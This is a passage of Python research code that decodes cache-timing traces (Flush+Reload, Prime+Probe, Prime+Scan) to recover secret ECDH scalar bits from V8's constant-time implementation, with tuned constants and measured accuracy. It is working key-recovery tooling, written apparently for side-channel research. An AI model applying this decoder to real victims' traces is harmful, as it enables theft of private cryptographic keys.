import argparse
import glob
import json
import os
import sys

import numpy as np
from collections import namedtuple

import utils
from utils import lat_to_hit

# ---------------------------------------------------------------------------
# Config / defaults
# ---------------------------------------------------------------------------

ratio_thresh = 0.60

grid_lo, grid_hi = 0.55, 1.80
merge_max = 0.50

# A per-trace period estimate is accepted into the CAPTURE's estimate only if
# the ladder it implies (nbits * T) covers this much of the trace's hit span.
# On P+P the 2-means split in split_gap lands on the re-prime cadence rather
# than the bit period in most traces -- measured on pp_k0_r00100, 70 of 100
# traces returned T ~ 2.9k against a true 47.9k -- and those traces then
# segment into 1000+ bursts and decode at chance. The two populations are three
# orders of magnitude apart in this ratio (0.05 against 0.8), so the filter
# needs no tuning; it exists to reject, not to choose.
period_lo, period_hi = 0.40, 1.50
period_probe_traces = 120

# Fixed intra/inter-step gap threshold for P+P, matching v8_ctjs_ecdh.cc's
# qual_gap_split: the two populations are ~2.6-4.3k cyc (the four BN.select
# calls of one step) and ~36-42k cyc (the field arithmetic between steps), an
# order of magnitude apart on either side of 10000, independently of key. The
# per-trace bootstrap above used to re-derive this threshold PER TRACE via
# split_gap's 2-means, which starves on a single trace's ~200-1000 samples and
# locks onto internal sub-structure in the small-gap population instead of the
# true split -- measured 30-54% per-trace acceptance at 100-1000 runs (the
# period_lo/period_hi note above). Pooling every trace's raw gaps into one
# 2-means call does not fix it either -- tried on pp_k0_r00100 and it landed
# at ~1.7k, worse than any single trace, because the pooled small-gap
# population has enough mass to reveal its OWN internal modes and 2-means
# splits those instead. The known-good fixed value raises per-trace
# acceptance to a consistent ~74% across every P+P capture tested (vs the
# 0-74% range above), independent of key or session.
pp_gap_split = 10000

# On the uniform-grid path the ladder's start is found outright (ladder_anchor),
# so the window search is a small correction around it rather than a scan of
# every burst -- 17 candidates instead of ~208, which is also what stops
# consensus from wandering off to a window hundreds of slots away. The
# remaining OFFSET from the anchor to bit 0 is the primitive's detection lag:
# P+P reports an access when the probe completes, measured 1 slot on
# pp_k0_r00100. It is chosen per capture, jointly with the phase, because the
# two trade off against each other (a whole slot is four quarter-slot phases).
window_margin = 8
align_offsets = 4
align_probe_traces = 40

band_lo = 0.88
band_hi = 0.99

llr_margin = 2.0
llr_folds = 3

history_taps = 2
history_ridge = 1e-2

# Sub-slot phase candidates for the eviction primitives. P+S and P+P report a
# detection LATE -- the access is seen when the probe completes, and the
# re-prime that follows is blind -- so the bursts find_slots lands on are offset
# from the true bit boundaries. Measured against the victim oracle on P+P: the
# period is recovered to 0.7% but the edges sit a MEDIAN OF HALF A BIT PERIOD
# from the truth, which makes every slot straddle two bits and costs most of the
# contrast (per-trace 0.525 against a 0.755 oracle ceiling). F+R does not need
# this (its response peaks at lag 0), so it stays at 1 there.
#
# Worth 1-2 bits on a healthy capture (P+P 131 -> 131 correct with 1 fewer
# wrong, P+S 27 -> 29) and more when the capture is dense enough to stress
# segmentation. 8 steps measured identical to 4, so 4 it is.
phase_steps = {"fr": 1, "ps": 4, "pp": 4}
phase_probe_traces = 120   # traces pooled to choose it; more does not move it
# Seed alignment by score bimodality instead of burst span. Measured WORSE on
# P+P (0.724 -> 0.558 known-acc) and on a degraded F+R capture, better on P+S;
# off by default, since span is what the rest of the pipeline was tuned with.
seed_by_contrast = False

# P+S matched decoder (vote_matched). Its response is smeared over ~4 slots and
# peaks at lag 1, so it needs a longer kernel than the F+R contamination model
# and a posterior -- not an LLR -- to decide which bits are resolved.
ps_posterior = 0.99
ps_fit_rounds = 8

# vote_counts: P+P's per-slot marker count is discrete and its likelihood is
# what carries the signal, so counts above this are pooled into one bin (they
# are rare and all mean the same thing) and the PMFs are fitted by EM.
count_cap = 12
count_em_rounds = 60
count_prior = 0.5
mode_halfwidth = 0.05
llr_first_pass = 2.5


# ---------------------------------------------------------------------------
# Capture loading
# ---------------------------------------------------------------------------

BuiltinLine = namedtuple("BuiltinLine", "handler off role")


def load_builtin_lines(directory):
    """Read the metadata the attacker writes next to the traces: one
    `<col> <role> <handler> <off> <primitive>` row per monitored line.

    Returns (list of BuiltinLine in column order, primitive). Field names and
    order match v8_ctjs_ecdh.cc's `struct builtin_line`, which produced it.
    The file is still called `channels` on disk -- 168 existing captures carry
    that name, several with 3, 4 or 6 columns and the previous leak site's
    offsets. Hard error if missing: guessing a layout silently swaps the marker
    and clock columns, which decodes to confident nonsense rather than to an
    error.
    """
    path = os.path.join(directory, "channels")
    if not os.path.exists(path):
        raise SystemExit(f"no `channels` metadata in {directory} -- the "
                         f"capture is incomplete; re-run run_ecdh_ct.sh")
    lines, prim = [], "fr"
    for ln in open(path):
        if ln.startswith("#") or not ln.strip():
            continue
        f = ln.split()
        lines.append(BuiltinLine(handler=f[2], off=f[3], role=f[1]))
        prim = f[4] if len(f) > 4 else prim
    return lines, prim


def load_trace(filepath, primitive):
    """One r<i>.out -> per-column arrays of hit timestamps.

    Parsing and the hit test both come from evaluation/utils.py, so a latency
    classifies here exactly as it does in the other experiments. A row is the
    i-th sample of each column, not a moment in time, so the columns are
    independent time series. F+R re-checks the latency (a capture taken with a
    looser -thresh can still be tightened offline); P+S only ever records
    samples already past its eviction threshold, so every one counts.
    """
    attack = "FR" if primitive == "fr" else "PS"   # ps and pp both pre-thresholded
    df = utils.load_trace(filepath)
    cols = []
    for i in range(df.shape[1]):
        ts = [p[0] for p in df[i]
              if p is not None and p[0] > 0 and lat_to_hit(p[1], attack)]
        cols.append(np.array(sorted(ts), dtype=np.int64))
    return cols


# ---------------------------------------------------------------------------
# Burst segmentation
# ---------------------------------------------------------------------------

def split_gap(gaps):
    """Threshold separating intra-burst gaps (one poll period) from inter-burst
    ones (one bit period), by 2-means on log10(gap). Both clusters span an order
    of magnitude or more and the split is deep, so this needs no tuning across
    poll rates or primitives."""
    lg = np.log10(np.maximum(gaps, 1))
    lo, hi = lg.min(), lg.max()
    if hi - lo < 0.3:
        return None
    c0, c1 = lo, hi
    for _ in range(30):
        mid = 0.5 * (c0 + c1)
        left, right = lg[lg <= mid], lg[lg > mid]
        if not len(left) or not len(right):
            return None
        n0, n1 = left.mean(), right.mean()
        if abs(n0 - c0) < 1e-6 and abs(n1 - c1) < 1e-6:
            break
        c0, c1 = n0, n1
    return 10 ** (0.5 * (c0 + c1))


def fit_uniform_grid(starts, T):
    """Burst starts -> a uniform ruler (a + b*i) fitted through them, and b.

    Once the period is known the burst starts are 246 noisy observations of one
    two-parameter line, so fitting beats using them directly: a burst's first
    hit is late by however long the victim took to touch the line and by the
    probe that caught it, and taking that jitter as a slot EDGE hands the error
    to the neighbouring slot as well. Measured on pp_k0_r00100 against the
    victim's own boundaries: raw starts 0.667 per-trace accuracy, this 0.761,
    with the detection ceiling at 0.777.

    Each burst is indexed by the rounded number of periods since its
    predecessor, so a slot the attacker never sampled leaves a hole in the
    index rather than shifting everything after it -- the same reason
    find_slots counts from the predecessor. The fit is then trimmed twice at
    3 MAD, which is what keeps a stalled iteration from tilting the ruler.
    """
    idx = np.concatenate(([0.0], np.cumsum(
        np.maximum(np.rint(np.diff(starts) / T), 1.0))))
    a, b = np.polyfit(idx, starts, 1)[::-1]
    for _ in range(3):
        resid = starts - (a + b * idx)
        s = 1.4826 * float(np.median(np.abs(resid))) + 1e-9
        keep = np.abs(resid) < 3.0 * s
        if keep.sum() < 8:
            break
        a, b = np.polyfit(idx[keep], starts[keep], 1)[::-1]
    if not (grid_lo * T < b < grid_hi * T):
        return None, None
    return a + b * np.arange(int(idx[-1]) + 1), float(b)


def ladder_anchor(pooled, starts, T, nbits, tol=1):
    """Index of the slot where the ladder's activity BEGINS, on a uniform grid.

    The ladder is a run of consecutively occupied slots, and what makes it
    findable is the silence in front of it: measured on pp_k0_r00100 against
    the victim's own boundaries, the six slots before the first ladder bit hold
    0.00 hits per trace, the first ladder slot holds a partial 1.93 clock hits
    against an interior mean of 4.12, and activity stops 2-3 slots after the
    last bit.

    So this takes the START of the longest occupied run, not the densest
    nbits-window: occupancy SATURATES across the ladder, every window inside it
    ties, and argmax then returns the earliest tie -- measured one slot early
    in 89 of 93 traces, which is a whole-key shift. `tol` empty slots are
    allowed inside a run, since a slot the attacker happened not to sample
    should not split the ladder in two.

    The remaining offset from here to bit 0 is the primitive's detection lag,
    which is a property of the capture rather than of the trace; EC_KEY
    .pick_alignment chooses it once, the same way the phase is chosen once."""
    pos = np.floor((pooled - starts[0]) / T).astype(np.int64)
    pos = pos[(pos >= 0) & (pos < len(starts))]
    occ = np.zeros(len(starts), dtype=bool)
    occ[np.unique(pos)] = True

    best_start, best_len = 0, 0
    i, n = 0, len(occ)
    while i < n:
        if not occ[i]:
            i += 1
            continue
        j, miss, last = i, 0, i
        while j < n:
            if occ[j]:
                last, miss = j, 0
            else:
                miss += 1
                if miss > tol:
                    break
            j += 1
        if last - i + 1 > best_len:
            best_start, best_len = i, last - i + 1
        i = j + 1
    return best_start


def count_mixture_ll(K, cap=None, rounds=None):
    """Total log-likelihood of a 2-component mixture fitted to per-slot counts.

    Used to choose the capture's alignment, not to decode: a grid whose slots
    line up with the victim's bits produces two clean count populations, and
    one that straddles produces their blur, so the fit is measurably better at
    the right offset. Measured over 16 (offset, phase) pairs on pp_k0_r00100,
    it picks 0.7331 per-trace accuracy against a 0.7414 best -- while the
    bimodality score candidate_contrast uses ranks the CATASTROPHIC offset
    (whole-key shift, 0.5217) second, 4.653 against 4.739. The likelihood
    separates the same pair by 543 nats.

    The EM is the memoryless one from vote_counts, without its component
    ordering: only the fit quality is wanted here, not which side is a 0."""
    cap = count_cap if cap is None else cap
    rounds = count_em_rounds if rounds is None else rounds
    K = np.clip(np.rint(np.atleast_2d(K)).astype(int), 0, cap)
    col = np.array([np.bincount(K[:, i], minlength=cap + 1)
                    for i in range(K.shape[1])], dtype=float)
    w = (K.mean(axis=0) >= np.median(K)).astype(float)
    p0 = p1 = None
    pi = 0.5
    for _ in range(rounds):
        h0 = w @ col + count_prior
        h1 = (1.0 - w) @ col + count_prior
        p0, p1 = h0 / h0.sum(), h1 / h1.sum()
        pi = min(max(float(w.mean()), 0.02), 0.98)
        d = col @ (np.log(p0) - np.log(p1)) + np.log(pi / (1.0 - pi))
        w_new = 1.0 / (1.0 + np.exp(-np.clip(d, -60, 60)))
        if np.max(np.abs(w_new - w)) < 1e-6:
            break
        w = w_new
    return float(np.sum(np.logaddexp(col @ np.log(p0) + np.log(pi),
                                     col @ np.log(p1) + np.log(1.0 - pi))))


def capture_period(files, primitive, nbits, sample=None):
    """The ladder's bit period for a WHOLE capture, or None.

    T is the victim's, not the trace's: every run of one capture executes the
    same ladder, and the measured spread is 46.4k-49.3k around a 47.9k truth.
    So it is worth estimating once from many traces and imposing on all of
    them, rather than re-derived per trace where a single bad split ruins that
    trace. Estimates that fail the period_lo/period_hi span test are dropped
    first -- see the note there; on P+P, before pp_gap_split, most were.
    """
    thresh = pp_gap_split if primitive == "pp" else None
    est = []
    for fp in files[:sample or len(files)]:
        cols = load_trace(fp, primitive)
        nonempty = [c for c in cols if len(c)]
        if not nonempty:
            continue
        pooled = np.sort(np.concatenate(nonempty))
        if len(pooled) < 16:
            continue
        _, T = find_slots(pooled, nbits, thresh=thresh)
        span = float(pooled[-1] - pooled[0])
        if not T or span <= 0:
            continue
        if period_lo < nbits * T / span < period_hi:
            est.append(T)
    return float(np.median(est)) if est else None


def find_slots(all_hits, nbits=None, T_hint=None, thresh=None):
    """All channels' hits (pooled) -> per-bit slot EDGES for the ladder.

    `thresh` overrides split_gap's per-call intra/inter-step threshold with a
    caller-supplied one -- see pp_gap_split, capture_period's only caller of
    this so far.

    grid_lo/grid_hi bound the steps taken to be exactly one ladder iteration
    (they set T's estimate); merge_max is the step below which two bursts are
    structure WITHIN one iteration rather than two iterations. Both are in
    units of the bit period.

    1. cut the hit stream into bursts on the gap threshold above;
    2. give each burst a slot index, counted from its PREDECESSOR rather than
       from the start of the capture -- a 1% error in the bit period would
       otherwise drift by whole slots over 250 iterations. Two bursts less than
       half a period apart are one split burst and share an index; a step of
       ~kT means k-1 bits went unsampled and leaves that many empty indices;
    3. pick the ladder as the densest window of `nbits` consecutive slots.
       Cutting on gap size instead does not work: derive()'s pre-ladder bursts
       are 12-40 periods before the ladder, but the ladder itself occasionally
       stalls for ~8 periods (scheduling), so there is no threshold that
       separates the two. Density is unambiguous -- the ladder is 250 occupied
       slots in a row and everything else is a handful;
    4. take each slot's edge from its own burst, interpolating across empty
       slots, so a stall or a slow iteration shifts nothing after it. (This is
       what the old decoder's uniform ruler got wrong.)

    With `T_hint` (a capture-level period, see capture_period) steps 1 and 2
    are replaced outright: bursts are cut at merge_max * T_hint and the edges
    come from fit_uniform_grid rather than from the bursts themselves. That is
    the path P+P takes, and it is what makes its windows countable -- 7 or so
    instead of the 800 a collapsed per-trace period produces.

    Returns (edges of length nslots+1, T) or (None, None)."""
    if len(all_hits) < 16:
        return None, None
    gaps = np.diff(all_hits)

    if T_hint:
        cut = np.flatnonzero(gaps > merge_max * T_hint) + 1
        starts = np.concatenate(([all_hits[0]], all_hits[cut])).astype(float)
        if len(starts) < 8:
            return None, None
        grid, T = fit_uniform_grid(starts, float(T_hint))
        # One burst per bit is what the BURST path needs, because there a slot
        # with no hits is a slot with no edge. A fitted grid interpolates
        # across those, so the test here is whether the ruler REACHES nbits
        # slots, not whether the attacker sampled every one of them. Measured
        # on pp_k0_r01000: requiring a burst per bit threw away 111 traces that
        # decode fine, 634 kept against 745.
        if grid is None or (nbits and len(grid) < nbits):
            return None, None
        return grid, T

    if thresh is None:
        thresh = split_gap(gaps)
        if thresh is None:
            return None, None

    cut = np.flatnonzero(gaps > thresh) + 1
    starts = np.concatenate(([all_hits[0]], all_hits[cut])).astype(float)
    if len(starts) < 8:
        return None, None

    step = np.diff(starts)
    period = float(np.median(step))
    core = step[(step > grid_lo * period) & (step < grid_hi * period)]
    T = float(np.median(core)) if len(core) else period
    if T <= 0:
        return None, None

    cut = np.flatnonzero(gaps > merge_max * T) + 1
    starts = np.concatenate(([all_hits[0]], all_hits[cut])).astype(float)
    step = np.diff(starts)
    if len(starts) < 8:
        return None, None

    if nbits and len(starts) < nbits:
        return None, None
    return starts, T


# ---------------------------------------------------------------------------
# Per-trace decode
# ---------------------------------------------------------------------------

def decode_candidates(cols, builtin_lines, nbits, tag=None, phases=1,
                      phase=None, phase_contrast=None, T_hint=None, offset=0):
    """One derive()'s hits -> one candidate decode per possible ladder window,
    and (for the eviction primitives) per sub-slot phase shift of the whole
    grid; see `phase_steps` for why the phase matters.

    Returns (list of MSB-first strings over {'0','1','u'}, offset of the
    tightest-span window within that list). The caller picks between them by
    consensus with the other traces; see align_candidates."""
    marker = [i for i, r in enumerate(builtin_lines)
              if r.role in "01" and i < len(cols)]
    clock = [i for i, r in enumerate(builtin_lines)
             if r.role == "c" and i < len(cols)]
    if not marker:
        return [], [], [], 0
    # A run can come back with no hits at all in ANY column -- rare on a healthy
    # capture, routine on a degraded one. Treat it like a trace that cannot be
    # segmented (drop it, keep decoding the rest); np.concatenate([]) instead
    # raises and kills the whole capture's decode.
    # Segmenting on the CLOCK ALONE is tempting -- pooling every column makes
    # the burst structure bit-DEPENDENT, since a 0-bit slot contributes the
    # marker's hits as well as the clock's -- and it does lift P+P's per-trace
    # accuracy, 0.672 to 0.723. It was tried on 2026-08-07 and reverted: far
    # fewer traces segment at all (P+P 841 -> 512) so the vote nets out level,
    # and F+R falls apart, `alt` going from 0 wrong to 56 and `free3` from 0 to
    # 8. The clock alone is too sparse to carry the segmentation there.
    nonempty = [c for c in cols if len(c)]
    if not nonempty:
        if tag:
            print(f"  [{tag}] no hits in any column")
        return [], [], [], 0
    pooled = np.sort(np.concatenate(nonempty))
    starts, T = find_slots(pooled, nbits, T_hint)
    if starts is None:
        if tag:
            print(f"  [{tag}] could not segment {len(pooled)} hits into bursts")
        return [], [], [], 0

    nwin = len(starts) - nbits + 1
    spans = starts[nbits - 1:] - starts[:nwin]
    if T_hint:
        # A fitted uniform grid gives every window the SAME span, so a
        # tightest-span seed degenerates to argmin = window 0 -- the earliest,
        # which is derive()'s pre-ladder activity, tens to hundreds of slots
        # before the ladder. Measured: the correct window was the LAST one in
        # every trace checked, 0.74-0.85 where window 0 scored 0.37, and
        # consensus then locked the whole capture onto it (known-acc 0.48).
        # Consensus cannot rescue that: every trace is wrong the same way, so
        # they agree with each other. The seed has to be right on its own.
        seed = min(max(ladder_anchor(pooled, starts, T, nbits) + offset, 0),
                   nwin - 1)
        lo0 = max(0, seed - window_margin)
        lo1 = min(nwin, seed + window_margin + 1)
        tightest = seed - lo0
    else:
        lo0, lo1 = 0, nwin
        seed = tightest = int(np.argmin(spans))

    def grid(lo, ph):
        return np.append(starts[lo:lo + nbits], starts[lo + nbits - 1] + T) - ph

    # Phase and window offset are SEPARABLE -- the phase shifts every slot
    # boundary by the same sub-slot amount, the offset slides the window by
    # whole slots -- so they are chosen one after the other, not jointly.
    # Scanning the product is what made this unusable: 8 phases x ~250 windows
    # x 1000 traces did not finish. Here it costs `phases` extra decodes.
    # `phase` is a FRACTION of the bit period, because T varies slightly from
    # trace to trace. It is chosen once per CAPTURE (EC_KEY.pick_phase), not
    # here: the shift is the primitive's detection lag, a property of the
    # machine and the poll loop, so every trace shares it. Choosing it per
    # trace measured WORSE than not shifting at all (P+P 0.775 -> 0.568) --
    # one trace's 246 slots are too little to estimate it from.
    if phase_contrast is not None:
        for k in range(phases):
            phase_contrast.append(candidate_contrast(
                decode_window(cols, marker, clock, builtin_lines,
                              grid(seed, k * T / phases))[1]))
    ph = (phase or 0.0) * T
    out = []
    for lo in range(lo0, lo1):
        out.append(decode_window(cols, marker, clock, builtin_lines,
                                 grid(lo, ph)))
    counts = [c for _, _, c in out]
    ratios = [r for _, r, _ in out]
    out = [k for k, _, _ in out]
    if tag:
        print(f"  [{tag}] {len(pooled)} hits, {len(starts)} slots for {nbits} "
              f"bits, T~{T:.0f}, {lo1 - lo0}/{nwin} windows x "
              f"{max(phases, 1)} phases, seed at +{seed}")
    return out, ratios, counts, tightest


def decode_window(cols, marker, clock, builtin_lines, edges):
    """Score one ladder window. Returns (labels, score, raw marker counts).

    Per slot, marker hits / clock hits: ~1.0 for a 0-bit, ~0.37 for a 1-bit
    (F+R, random scalar). The RAW counts come back too because for P+P they
    are the whole signal and averaging them away loses it -- see vote_counts.

    Returns (per-trace labels, voting score). The score is the marker COUNT
    scaled by this trace's MEDIAN clock count, so captures at different poll
    rates share one threshold. Do NOT normalise per slot by that slot's own
    clock count: it injects the clock's variance into a quantity whose 0-bit
    value is otherwise very tight (3.63 +- 0.09 of the 4 BN.select calls), and
    that tightness is the whole separation from contaminated 1-bits. Measured,
    per-slot leaves 5-12 bits wrong where the count leaves 0-4.

    A capture with no role 'c' line falls back to a constant 4.0 normaliser and
    decodes badly (14-22 wrong): the clock is required. Roles come from the
    capture's own `channels` file -- BitwiseAndHandler+0x000 runs 12x per
    BN.select and must never carry role 'c'."""
    n = len(edges) - 1

    def counts(idxs):
        """Per-slot hit count, AVERAGED over the channels in this role: the two
        clock lines each fire once per BN.select, so summing them would double
        the ratio's denominator."""
        total = np.zeros(n, dtype=float)
        for i in idxs:
            pos = np.searchsorted(edges, cols[i], side="right") - 1
            pos = pos[(pos >= 0) & (pos < n)]
            total += np.bincount(pos, minlength=n)
        return total / len(idxs) if idxs else total

    m = counts(marker)
    c = counts(clock) if clock else np.full(n, 4.0)
    marker_value = builtin_lines[marker[0]].role
    other = "1" if marker_value == "0" else "0"

    empty = (m == 0) & (c == 0)
    labels = np.where(m / np.maximum(c, 1) >= ratio_thresh, marker_value, other)
    labels[empty] = "u"

    scale = float(np.median(c))
    score = m / (scale if scale > 0 else 1.0)
    score[empty] = np.nan
    return "".join(labels), score, m


def candidate_contrast(score):
    """How two-population a candidate window's per-slot scores look, as a
    standardised gap between the two clusters a 2-means split finds.

    This is the seed for align_candidates, and it is what makes a sub-slot
    PHASE choosable. A window at the wrong phase straddles two bits in every
    slot, so 0-bits and 1-bits blur into one mode and the gap collapses; at the
    right phase they separate. It uses no knowledge of the key and no
    comparison with other traces -- which is exactly what the tightest-span
    seed it replaces could not do, since span measures how COMPACT a window is
    and a half-period-shifted window is just as compact as the right one."""
    s = score[np.isfinite(score)]
    if len(s) < 8:
        return -np.inf
    c0, c1 = float(s.min()), float(s.max())
    if c1 - c0 < 1e-9:
        return -np.inf
    for _ in range(30):
        mid = 0.5 * (c0 + c1)
        lo, hi = s[s <= mid], s[s > mid]
        if not len(lo) or not len(hi):
            return -np.inf
        n0, n1 = float(lo.mean()), float(hi.mean())
        if abs(n0 - c0) < 1e-9 and abs(n1 - c1) < 1e-9:
            break
        c0, c1 = n0, n1
    lo, hi = s[s <= 0.5 * (c0 + c1)], s[s > 0.5 * (c0 + c1)]
    sd = np.sqrt((lo.var() * len(lo) + hi.var() * len(hi)) / len(s))
    return (c1 - c0) / max(float(sd), 1e-6)


def count_emissions(K, bits, cap, prior):
    """P(k | this bit, PREVIOUS bit) as four PMFs, from a hard bit assignment."""
    e = np.full((2, 2, cap + 1), prior)
    n = K.shape[1]
    for b in (0, 1):
        for pb in (0, 1):
            idx = [i for i in range(1, n) if bits[i] == b and bits[i - 1] == pb]
            if idx:
                e[b, pb] += np.bincount(K[:, idx].ravel(), minlength=cap + 1)
    return np.log(e / e.sum(axis=2, keepdims=True))


def viterbi_counts(L, posteriors=False):
    """Best bit sequence under log-emissions L[slot, bit, prev bit].

    Transitions are uniform: ladder bits are an ECDH scalar, so nothing about
    bit i predicts bit i+1. All the structure is in the emission's dependence
    on the previous bit."""
    n = L.shape[0]
    lp = np.full((n, 2), -np.inf)
    bp = np.zeros((n, 2), dtype=int)
    lp[0] = np.logaddexp(L[0, :, 0], L[0, :, 1]) - np.log(2.0)
    for i in range(1, n):
        for b in (0, 1):
            cand = lp[i - 1] + L[i, b, :]
            bp[i, b] = int(np.argmax(cand))
            lp[i, b] = cand[bp[i, b]]
    z = np.zeros(n, dtype=int)
    z[n - 1] = int(np.argmax(lp[n - 1]))
    for i in range(n - 1, 0, -1):
        z[i - 1] = bp[i, z[i]]
    if not posteriors:
        return z, None

    def lse(a, axis=None):
        m = np.max(a, axis=axis, keepdims=True)
        return (m + np.log(np.sum(np.exp(a - m), axis=axis, keepdims=True))
                ).squeeze(axis)

    f = np.full((n, 2), -np.inf)
    f[0] = lp[0]
    for i in range(1, n):
        for b in (0, 1):
            f[i, b] = lse(f[i - 1] + L[i, b, :])
    bwd = np.zeros((n, 2))
    for i in range(n - 2, -1, -1):
        for pb in (0, 1):
            bwd[i, pb] = lse(np.array([L[i + 1, b, pb] + bwd[i + 1, b]
                                       for b in (0, 1)]))
    post = f + bwd
    post -= lse(post, axis=1)[:, None]
    return z, np.exp(post[:, 0])


def majority(keys):
    """Per-position majority label over a set of decodes, for use as an
    alignment reference (the real answer comes from EC_KEY.vote)."""
    n = min(len(k) for k in keys)
    out = []
    for i in range(n):
        z = sum(k[i] == "0" for k in keys)
        o = sum(k[i] == "1" for k in keys)
        out.append("0" if z > o else "1" if o > z else "u")
    return "".join(out)


# ---------------------------------------------------------------------------
# History contamination model
# ---------------------------------------------------------------------------

def zero_cluster(f, halfwidth=None):
    """Locate the 0-bit population: (centre, sd), or (None, None).

    It is the densest `halfwidth` window of the averaged score. That works
    without knowing the key because the two populations have wildly different
    concentrations -- 0-bits sit within ~0.02 of their mean, 1-bits are spread
    over ~0.3 -- so even a scalar that is mostly 1-bits cannot produce a denser
    window than its 0-bits do."""
    halfwidth = mode_halfwidth if halfwidth is None else halfwidth
    g = f[np.isfinite(f)]
    if len(g) < 8:
        return None, None
    grid = np.linspace(g.min(), g.max(), 400)
    dens = np.array([np.sum(np.abs(g - c) <= halfwidth) for c in grid])
    core = g[np.abs(g - grid[int(np.argmax(dens))]) <= halfwidth]
    return float(core.mean()), max(float(core.std()), 1e-3)


def fit_history_fir(z, f, K=None, ridge=None):
    """Fit E[score | 1-bit] = w0 + sum_{k=1..K} w_k * z[i-k] by ridge least
    squares on the currently-labelled 1-bits. Returns (w, residual sd).

    An FIR rather than a decaying state, because the contamination is not
    monotone in recency: measured against the -bits oracle, a 1-bit's mean
    marker count by its two predecessors is 00 -> 2.54, 01 -> 1.70, 10 -> 1.55,
    11 -> 0.64. A decay must put 10 above 01; the measurement puts 01 higher.
    Fitted weights are nearly flat (~0.27, 0.27, 0.16), not a decay.

    The ridge term is load-bearing. On a periodic scalar the lagged regressors
    go collinear with the label being fitted, the unpenalised solution is
    arbitrary along that null direction, and the relabelling iteration follows
    it to a confidently INVERTED decode (alt at -wait=1000: 3.8% correct on 79
    'known' bits). Do not raise K past 4 -- the intercept goes negative.

    history_taps MUST be >= 1. K=0 (the removed single-pole model) scored best
    on random scalars and inverted an all-ones scalar outright, 230 of 231 known
    bits wrong: a constant scalar has no 0-cluster to anchor on. Always include
    ones/zeros when sweeping K. K is also coupled to the attacker's poll rate --
    K=3 at -wait=200, K=2 at -wait=2000 -- so re-derive it if -wait changes."""
    K = history_taps if K is None else K
    ridge = history_ridge if ridge is None else ridge
    n = len(z)
    X = np.stack([np.ones(n)] +
                 [np.concatenate([np.zeros(k), z[:-k]]) for k in range(1, K + 1)], 1)
    ones = z < 0.5
    ones[:K] = False
    if ones.sum() < 4 * (K + 1):
        return None, None
    A, y = X[ones], f[ones]
    pen = np.eye(K + 1) * ridge
    pen[0, 0] = 0.0
    w = np.linalg.solve(A.T @ A + pen * len(y), A.T @ y)
    sd = max(float((y - A @ w).std()), 1e-3)
    return w, sd


def fit_matched_kernel(z, f, taps, ridge=None):
    """Least squares for f[i] = c + sum_{k=0..taps-1} h[k]*z[i-k].

    Ridged for the same reason fit_history_fir is: on a periodic scalar the
    lagged regressors go collinear and an unpenalised fit runs away."""
    ridge = history_ridge if ridge is None else ridge
    n = len(f)
    X = np.ones((n, taps + 1))
    for k in range(taps):
        col = np.zeros(n)
        if k < n:
            col[k:] = z[:n - k]
        X[:, k + 1] = col
    gram = X.T @ X + ridge * np.eye(taps + 1)
    coef = np.linalg.solve(gram, X.T @ f)
    return float(coef[0]), coef[1:]


def ps_noise_sd(f, c, h, z=None):
    """Residual sd of the matched model, floored so a lucky fit cannot make the
    Viterbi emissions arbitrarily confident."""
    if z is None:
        return max(float(np.std(f)) * 0.5, 1e-3)
    resid = f - (c + history_convolve(z, h))
    return max(float(np.std(resid)), 1e-3)


def history_convolve(z, h):
    """sum_k h[k]*z[i-k], zero-padded at the start."""
    out = np.zeros(len(z))
    for k, hk in enumerate(h):
        if k:
            out[k:] += hk * z[:len(z) - k]
        else:
            out += hk * z
    return out


def viterbi_matched(f, c, h, sd, posteriors=False):
    """MAP bit sequence under f[i] = c + sum_k h[k]*z[i-k], plus per-bit
    posteriors when asked.

    The state is the previous taps-1 z values, so choosing z[i] fixes the
    predicted level exactly. Both passes share one emission table; the
    forward-backward posterior is what decides resolved-vs-unknown, because the
    Viterbi path alone is as confident on a smeared bit as on a clean one."""
    n = len(f)
    taps = len(h)
    mem = taps - 1
    nstates = 1 << mem if mem > 0 else 1

    # emit[i, s, b] = log N(f[i] | c + h.z), state s holding z[i-1..i-mem]
    lvl = np.zeros((nstates, 2))
    for s in range(nstates):
        past = [(s >> k) & 1 for k in range(mem)]   # past[0] = z[i-1]
        base = c + sum(h[k + 1] * past[k] for k in range(mem))
        lvl[s, 0] = base
        lvl[s, 1] = base + h[0]
    emit = -0.5 * ((f[:, None, None] - lvl[None, :, :]) / sd) ** 2

    def nxt(s, b):
        return ((s << 1) | b) & (nstates - 1) if mem else 0

    neg = -1e18
    delta = np.full((n, nstates), neg)
    back = np.zeros((n, nstates), dtype=np.int64)
    delta[0, 0] = 0.0
    for i in range(n):
        if i:
            prev = delta[i - 1]
            for s in range(nstates):
                if prev[s] <= neg / 2:
                    continue
                for b in (0, 1):
                    t = nxt(s, b)
                    cand = prev[s] + emit[i - 1, s, b]
                    if cand > delta[i, t]:
                        delta[i, t] = cand
                        back[i, t] = s * 2 + b
    # last step's emission
    final = np.full(nstates, neg)
    last_choice = np.zeros(nstates, dtype=np.int64)
    for s in range(nstates):
        if delta[n - 1, s] <= neg / 2:
            continue
        for b in (0, 1):
            cand = delta[n - 1, s] + emit[n - 1, s, b]
            if cand > final[nxt(s, b)]:
                final[nxt(s, b)] = cand
                last_choice[nxt(s, b)] = s * 2 + b

    z = np.zeros(n, dtype=np.int64)
    s = int(np.argmax(final))
    s, b = last_choice[s] // 2, last_choice[s] % 2
    z[n - 1] = b
    for i in range(n - 1, 0, -1):
        prev, b = back[i, s] // 2, back[i, s] % 2
        z[i - 1] = b
        s = prev
    if not posteriors:
        return z, None

    # forward-backward on the same emissions, in log space
    def lse(a, axis=None):
        m = np.max(a, axis=axis, keepdims=True)
        m = np.where(np.isfinite(m), m, 0.0)
        return (m + np.log(np.sum(np.exp(a - m), axis=axis, keepdims=True))).squeeze(axis)

    fw = np.full((n + 1, nstates), neg)
    fw[0, 0] = 0.0
    for i in range(n):
        for s in range(nstates):
            if fw[i, s] <= neg / 2:
                continue
            for b in (0, 1):
                t = nxt(s, b)
                fw[i + 1, t] = np.logaddexp(fw[i + 1, t], fw[i, s] + emit[i, s, b])
    bw = np.full((n + 1, nstates), neg)
    bw[n, :] = 0.0
    for i in range(n - 1, -1, -1):
        for s in range(nstates):
            acc = neg
            for b in (0, 1):
                acc = np.logaddexp(acc, emit[i, s, b] + bw[i + 1, nxt(s, b)])
            bw[i, s] = acc

    post = np.zeros(n)
    for i in range(n):
        num = np.full(2, neg)
        for s in range(nstates):
            if fw[i, s] <= neg / 2:
                continue
            for b in (0, 1):
                num[b] = np.logaddexp(
                    num[b], fw[i, s] + emit[i, s, b] + bw[i + 1, nxt(s, b)])
